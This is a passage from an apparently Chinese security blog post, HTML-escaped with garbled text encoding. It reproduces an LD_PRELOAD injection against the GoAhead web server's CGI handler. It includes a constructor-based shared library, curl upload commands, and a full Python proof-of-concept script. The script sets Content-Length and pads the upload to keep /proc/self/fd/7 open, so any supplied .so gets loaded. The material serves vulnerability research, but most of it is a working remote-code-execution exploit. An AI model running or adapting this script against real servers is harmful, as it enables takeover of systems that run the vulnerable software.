&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°è¯•hello world&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">before_main&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">__attribute__&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">constructor&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">before_main&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello: World&lt;/span>&lt;span style="color:#8045ff">\r\n\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hacked&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -shared -fPIC hello.c -o hello.so
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ curl -v -F &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>@hello.so -F &lt;span style="color:#d88200">&amp;#34;LD_PRELOAD=/proc/self/fd/7&amp;#34;&lt;/span> &lt;span style="color:#d88200">&amp;#34;url/cgi-bin/test&amp;#34;&lt;/span> -i
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323001558145.png" alt="image-20220323001558145">&lt;/p>
&lt;p>æŸ¥çœ‹æ—¥å¿—æŠ¥Too bigé”™è¯¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#ifndef ME_GOAHEAD_LIMIT_POST
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define ME_GOAHEAD_LIMIT_POST 16384
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#endif
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ€å¤§16384å­—èŠ‚ï¼Œæˆ‘ä»¬åœ¨gccæ—¶å¢åŠ &lt;code>-s&lt;/code>å‚æ•°æ¥å‡å°ä½“ç§¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -s -shared -fPIC hello.c -o hello.so
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ curl -v -F &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>@hello.so -F &lt;span style="color:#d88200">&amp;#34;LD_PRELOAD=/proc/self/fd/7&amp;#34;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://192.168.31.214:8080/cgi-bin/test&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç»“æœæŠ¥404ï¼Œfd/nè¿™æ ·çš„æ–‡ä»¶æè¿°ç¬¦å¯¹åº”çš„å†…å®¹éƒ½æ— æ³•æ‰“å¼€ï¼Œpç‰›çŒœæµ‹çš„å¯èƒ½æ˜¯ï¼šCGIæ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œè¢«æ‰“å¼€çš„ä¸´æ—¶æ–‡ä»¶æè¿°ç¬¦å·²ç»å…³é—­ï¼Œæ‰€ä»¥æ— æ³•æ‰“å¼€&lt;/p>
&lt;p>ç…§è¿™æ ·çš„æ¨æµ‹ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°æ¡ä»¶ç«äº‰ï¼Œä¸€ä¸ªä¸Šä¼ ä¸€ä¸ªåŒ…å«ï¼Œæˆ–è€…æ˜¯ç»™.soæ–‡ä»¶åå¢åŠ è„å­—ç¬¦ ä½†æ˜¯CLå¤´çš„é•¿åº¦å°äºæœ€ç»ˆæ•°æ®åŒ…çš„å¤§å°ï¼Œè¿™æ ·GoAheadè¯»å–æ•°æ®åŒ…çš„æ—¶å€™èƒ½å¤Ÿå®Œå…¨è¯»å–åˆ°payload.soçš„å†…å®¹ï¼Œä½†å®é™…è¿™ä¸ªæ–‡ä»¶å¹¶æ²¡æœ‰ä¸Šä¼ å®Œæ¯•&lt;/p>
&lt;p>é¦–å…ˆæ„é€ å¥½ä¹‹å‰é‚£ä¸ªæ— æ³•åˆ©ç”¨çš„æ•°æ®åŒ…ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªè¡¨å•å­—æ®µæ˜¯&lt;code>LD_PRELOAD&lt;/code>ï¼Œå€¼æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œä¸€èˆ¬æ˜¯&lt;code>/proc/self/fd/7&lt;/code>ï¼Œä¹‹åå¯¹ä¹‹å‰çš„æ•°æ®åŒ….soæœ«å°¾å¢åŠ å‡ åƒä¸ªå­—èŠ‚çš„è„å­—ç¬¦ï¼Œæ¯”å¦‚è¯´&lt;code>a&lt;/code>ï¼Œä¹‹åå°†æ•°æ®åŒ…çš„CLè®¾ç½®ä¸ºä¸è¶…è¿‡16384çš„å€¼ï¼Œä½†æ¯”payload.soæ–‡ä»¶çš„å¤§å°è¦å¤§ä¸ª500å­—èŠ‚å·¦å³&lt;/p>
&lt;p>ç”±äºä¸Šä¼ æµç¨‹æ²¡æœ‰ç»“æŸï¼Œæ‰€ä»¥æ­¤æ—¶æ–‡ä»¶æè¿°ç¬¦æ˜¯æ²¡æœ‰å…³é—­çš„ï¼Œå¯ä»¥é€šè¿‡&lt;code>/proc/self/fd/7&lt;/code>è¯»å–åˆ°ï¼Œè„å­—ç¬¦ä¹Ÿä¸å½±å“åŠ¨æ€é“¾æ¥åº“çš„åŠ è½½å’Œè¿è¡Œï¼Œæœ€åå³å¯æˆåŠŸå®ŒæˆåŠ«æŒ&lt;/p>
&lt;p>pç‰›å·²ç»å†™å¥½äº†è„šæœ¬&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ssl&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urlparse&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">ParseResult&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">PAYLOAD_MAX_LENGTH&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">16384&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">client&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">ParseResult&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">boundary&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;----&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1000000000000&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999999999999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">padding&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">content_length&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">min&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">500&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">PAYLOAD_MAX_LENGTH&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">fr&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;POST &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hostname&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Accept-Encoding: gzip, deflate
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Accept: */*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Accept-Language: en
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: close
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: multipart/form-data; boundary=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">boundary&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Length: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">content_length&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">--&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">boundary&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;LD_PRELOAD&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">/proc/self/fd/7
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">--&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">boundary&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;data&amp;#34;; filename=&amp;#34;1.txt&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: text/plain
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">#payload#&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">padding&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">--&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">boundary&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">--
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">encode&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;#payload#&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">client&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">client&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">20480&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">target&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload_filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">PAYLOAD_MAX_LENGTH&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;payload size must not larger than &lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">PAYLOAD_MAX_LENGTH&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">parts&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">urlparse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">port&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">port&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">scheme&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;https&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">443&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">context&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ssl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">create_default_context&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">create_connection&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hostname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">timeout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">client&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">scheme&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;https&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">wrap_socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">client&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">server_hostname&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hostname&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">ssock&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ssock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">client&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python3 poc.py http://target-ip:8080/cgi-bin/index /path/to/payload.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323003607010.png" alt="image-20220323003607010">&lt;/p>
&lt;p>æˆåŠŸåŠ«æŒ&lt;/p>
